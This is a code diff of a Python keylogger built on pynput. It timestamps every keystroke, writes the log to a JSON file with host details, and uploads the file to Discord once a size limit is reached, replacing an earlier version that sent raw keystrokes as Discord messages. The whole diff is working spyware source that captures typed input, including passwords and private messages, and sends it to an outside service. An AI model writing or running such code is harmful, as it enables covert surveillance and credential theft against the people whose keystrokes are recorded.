@@ -1,43 +1,30 @@
 from pynput.keyboard import Listener, Key
 
+from classes.Host import Host
 from discord_util import discord
+from utils.file_util import write_keys_to_file, get_object_size
 from utils.time_util import get_current_date_and_time
 
 key_log = {}
 
+host = Host()
 
-def write_file(key_list):
-    result = ""
-    for key in key_list:
-        key = str(key).replace("'", "")
-        key = key.replace("Key.space", " ")
-        result += key
-    print(result)
-    discord.send_message(result)
+json_file = "json_key_log.txt"
+legible_text_file = "legible_log.txt"
 
+# discord file sending limit is 8MB, but we will use 5MB to be safe
+discord_file_size_limit = 5
 
-# def on_press(key):
-#     global keys, count
-#     print(key)
-#     key_log[get_current_date_and_time()] = key
-#     count += 1
-#     if count >= 10:
-#         count = 0
-#         write_file(keys)
-#         keys = []
 
 def on_press(key):
     key_log[get_current_date_and_time()] = str(key).replace("'", "")
 
-    print()
-    print("Length " + str(len(key_log)))
-    print()
-
-    # Testing with message sending
-    # TODO: Implement writing json to file and sending file to discord,
-    #  then create method to convert json to legible text
-    if len(key_log) >= 40 and (key == Key.enter or key == Key.space):
-        discord.send_message(key_log)
+    print(get_object_size(key_log))
+    # using this size for testing purposes
+    if get_object_size(key_log) >= 0.002 and (key == Key.enter or key == Key.space):
+        write_keys_to_file(key_log, json_file, host)
+        discord.send_file(json_file, json_file)
+        # TODO: then create method to convert json to legible text
         key_log.clear()
 
 
